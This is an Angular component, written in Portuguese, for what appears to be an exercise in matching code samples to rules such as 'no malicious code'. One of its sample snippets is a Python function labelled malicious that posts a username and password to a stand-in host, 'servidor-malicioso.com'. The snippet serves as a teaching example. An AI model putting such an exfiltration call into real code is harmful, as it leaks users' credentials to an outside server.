import { Component } from '@angular/core';
import { Codigo } from './interfaces/codigo';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  erro = {
    codigoMalicioso : "codigoMalicioso",
    nomenclaturaErrada : "nomenclaturaErrada",
    none : ''
  }

  regras = [
    {
      regra : 'Não pode ter codigo malicioso',
      error : this.erro.codigoMalicioso
    }
  ]

  codigo = [
    {
      function : `def enviar_dados_sensiveis():
      dados = {
          'usuario': 'admin',
          'senha': '123456'
      }
      response = requests.post('http://www.servidor-malicioso.com', data=dados)`,
      error : this.erro.codigoMalicioso
    },
    {
      function : `def calcular_soma(lista):
      soma = 0
      for elemento in lista:
          soma += elemento
      return soma`,
      error : this.erro.none
    }
  ]

  codigoSelecionado : any
  regraSelecionada : any

  codigoSelected(code: any) {
    this.codigoSelecionado = code
    this.compare()
  }
  
  regraSelected(regra: any) {
    this.regraSelecionada = regra
    this.compare()
  }

  async compare() {
    if(this.codigoSelecionado == null || this.regraSelecionada == null) return
    if(this.codigoSelecionado.error == this.regraSelecionada.error) {
      console.log("achou um erro")
    }else {
      console.log("Tudo certo por aqui!")
    }
    await new Promise(resolve => setTimeout(resolve, 300));
    this.codigoSelecionado = null
    this.regraSelecionada = null
  }
}
